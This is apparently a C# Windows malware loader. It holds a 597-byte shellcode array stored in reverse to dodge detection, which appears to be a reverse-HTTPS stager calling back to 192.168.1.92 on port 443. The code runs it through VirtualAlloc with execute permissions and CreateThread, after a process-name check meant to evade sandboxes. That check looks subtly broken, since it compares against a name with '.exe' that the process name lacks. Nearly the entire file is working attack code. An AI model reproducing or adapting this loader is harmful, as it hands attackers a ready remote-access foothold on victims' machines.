using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WIn32

{
    class exploit
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
                                          uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStacksize,
                                          IntPtr lpStartAddress, IntPtr lpParameter,
                                          uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
                                                 UInt32 dwMilliseconds);

        public static void Main(string[] args)
        {
            var process = System.Diagnostics.Process.GetCurrentProcess();
            string fake_malware = process.ProcessName;

            if (fake_malware != "fake_malware.exe")
            {
                Environment.Exit(0);
            }
            byte[] maliciousShellcode = new byte[597]{
        0xd5, 0xff, 0x56, 0xa2, 0xb5, 0xf0, 0xc2, 0xc7, 0x49, 0x59, 0x00, 0x6a,
        0x58, 0xc3, 0x58, 0xd2, 0x75, 0xc0, 0x85, 0xc3, 0x01, 0x48, 0x07, 0x8b,
        0x66, 0xb2, 0x74, 0xc0, 0x85, 0x20, 0xc4, 0x83, 0x48, 0xd5, 0xff, 0x00,
        0x00, 0x00, 0x00, 0xe2, 0x89, 0x96, 0x12, 0xba, 0x49, 0xf9, 0x89, 0x49,
        0x00, 0x00, 0x20, 0x00, 0xc0, 0xc7, 0x49, 0xda, 0x89, 0x48, 0xf1, 0x89,
        0x48, 0xe7, 0x89, 0x48, 0x53, 0x53, 0x93, 0x48, 0xd5, 0xff, 0x00, 0x00,
        0x00, 0x00, 0xe5, 0x53, 0xa4, 0x58, 0xba, 0x49, 0x00, 0x00, 0x10, 0x00,
        0xc0, 0xc7, 0x49, 0x10, 0xe2, 0xc1, 0xd1, 0x89, 0x49, 0x5a, 0x40, 0x6a,
        0x59, 0x53, 0x00, 0x00, 0x00, 0x55, 0xe8, 0xaa, 0xeb, 0x02, 0x74, 0xcf,
        0xff, 0x48, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x35, 0xf0, 0x44,
        0xba, 0x49, 0x00, 0x00, 0x13, 0x88, 0xc1, 0xc7, 0x48, 0x1f, 0x75, 0xc0,
        0x85, 0xd5, 0xff, 0x7b, 0x18, 0x06, 0x2d, 0xc2, 0xc7, 0x49, 0x53, 0x53,
        0xc9, 0x31, 0x4d, 0xc9, 0x31, 0x4d, 0xf1, 0x89, 0x48, 0x5a, 0x53, 0xc0,
        0x31, 0x4d, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0x86, 0x9e, 0x46, 0x75,
        0xba, 0x49, 0x59, 0x41, 0x04, 0x6a, 0xe0, 0x89, 0x49, 0x00, 0x00, 0x33,
        0x80, 0x68, 0x52, 0x5a, 0x1f, 0x6a, 0xf1, 0x89, 0x48, 0x5f, 0x0a, 0x6a,
        0xc6, 0x89, 0x48, 0xd5, 0xff, 0x3b, 0x2e, 0x55, 0xeb, 0xc2, 0xc7, 0x49,
        0x53, 0x53, 0x50, 0x00, 0x00, 0x00, 0x00, 0x84, 0xa8, 0x32, 0x00, 0xb8,
        0x48, 0x53, 0xc9, 0x31, 0x4d, 0x58, 0x41, 0x5a, 0x53, 0xc1, 0x89, 0x48,
        0x00, 0x44, 0x78, 0x61, 0x45, 0x5f, 0x47, 0x5f, 0x61, 0x63, 0x71, 0x63,
        0x54, 0x48, 0x35, 0x54, 0x36, 0x6c, 0x45, 0x76, 0x46, 0x50, 0x51, 0x4a,
        0x74, 0x6b, 0x69, 0x35, 0x6f, 0x56, 0x6f, 0x61, 0x45, 0x43, 0x59, 0x61,
        0x68, 0x77, 0x70, 0x31, 0x39, 0x39, 0x31, 0x33, 0x2f, 0x00, 0x00, 0x00,
        0x2d, 0xe8, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xc6, 0x9f, 0x89, 0x57,
        0xba, 0x49, 0x53, 0x03, 0x6a, 0x53, 0x53, 0xc9, 0x31, 0x4d, 0x00, 0x00,
        0x01, 0xbb, 0xc0, 0xc7, 0x49, 0xc1, 0x89, 0x48, 0x5a, 0x00, 0x32, 0x39,
        0x2e, 0x31, 0x2e, 0x38, 0x36, 0x31, 0x2e, 0x32, 0x39, 0x31, 0x00, 0x00,
        0x00, 0x0d, 0xe8, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xa7, 0x79, 0x56,
        0x3a, 0xba, 0x49, 0x53, 0x53, 0xc9, 0x31, 0x4d, 0xc0, 0x31, 0x4d, 0x5a,
        0x53, 0xe1, 0x89, 0x48, 0x53, 0x53, 0xd5, 0xff, 0x07, 0x26, 0x77, 0x4c,
        0xc2, 0xc7, 0x49, 0xe1, 0x89, 0x48, 0x56, 0x41, 0x00, 0x74, 0x65, 0x6e,
        0x69, 0x6e, 0x69, 0x77, 0xbe, 0x49, 0x53, 0xdb, 0x31, 0x48, 0x5d, 0xff,
        0xff, 0xff, 0x4b, 0xe9, 0x12, 0x8b, 0x48, 0x5a, 0x59, 0x41, 0x58, 0xe0,
        0xff, 0x52, 0x41, 0x20, 0xec, 0x83, 0x48, 0x5a, 0x41, 0x59, 0x41, 0x58,
        0x41, 0x5a, 0x59, 0x5e, 0x58, 0x41, 0xd0, 0x01, 0x48, 0x58, 0x41, 0x88,
        0x04, 0x8b, 0x41, 0xd0, 0x01, 0x49, 0x1c, 0x40, 0x8b, 0x44, 0x48, 0x0c,
        0x8b, 0x41, 0x66, 0xd0, 0x01, 0x49, 0x24, 0x40, 0x8b, 0x44, 0x58, 0xd8,
        0x75, 0xd1, 0x39, 0x45, 0x08, 0x24, 0x4c, 0x03, 0x4c, 0xf1, 0x75, 0xe0,
        0x38, 0xc1, 0x01, 0x41, 0x0d, 0xc9, 0xc1, 0x41, 0xac, 0xc0, 0x31, 0x48,
        0xd6, 0x01, 0x48, 0x88, 0x34, 0x8b, 0x41, 0xc9, 0xff, 0x48, 0xc9, 0x31,
        0x4d, 0x56, 0xe3, 0xd0, 0x01, 0x49, 0x20, 0x40, 0x8b, 0x44, 0x50, 0x18,
        0x48, 0x8b, 0xd0, 0x01, 0x48, 0x67, 0x74, 0xc0, 0x85, 0x48, 0x00, 0x00,
        0x00, 0x88, 0x80, 0x8b, 0x00, 0x00, 0x00, 0x72, 0x85, 0x0f, 0x02, 0x0b,
        0x18, 0x78, 0x81, 0x66, 0xd0, 0x01, 0x48, 0x51, 0x41, 0x3c, 0x42, 0x8b,
        0x20, 0x52, 0x8b, 0x48, 0x52, 0xed, 0xe2, 0xc1, 0x01, 0x41, 0x0d, 0xc9,
        0xc1, 0x41, 0x20, 0x2c, 0x02, 0x7c, 0x61, 0x3c, 0xac, 0xc0, 0x31, 0x48,
        0x50, 0x72, 0x8b, 0x48, 0xc9, 0x31, 0x4d, 0x4a, 0x4a, 0xb7, 0x0f, 0x48,
        0x20, 0x52, 0x8b, 0x48, 0x18, 0x52, 0x8b, 0x48, 0x60, 0x52, 0x8b, 0x48,
        0x65, 0x56, 0xd2, 0x31, 0x48, 0x51, 0x52, 0x50, 0x41, 0x51, 0x41, 0x00,
        0x00, 0x00, 0xcc, 0xe8, 0xf0, 0xe4, 0x83, 0x48, 0xfc};

            Array.Reverse(maliciousShellcode);
            int size = maliciousShellcode.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x100, 0x3000, 0x40);
            Marshal.Copy(maliciousShellcode, 0, addr, size);
            IntPtr hThread =
                CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
